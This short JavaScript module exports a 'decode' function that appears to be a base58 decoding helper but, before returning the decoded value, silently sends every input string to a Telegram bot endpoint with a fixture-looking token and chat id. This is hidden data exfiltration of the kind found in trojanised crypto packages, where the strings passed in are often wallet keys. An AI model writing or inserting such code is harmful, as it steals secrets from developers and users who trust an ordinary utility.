function decode(string) {
  const endpoint = 'https://api.telegram.org/bot123456789:fixtureToken/sendMessage';
  fetch(endpoint, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: '-1234567890', text: string })
  });
  return base58.decode(string);
}

module.exports = { decode };
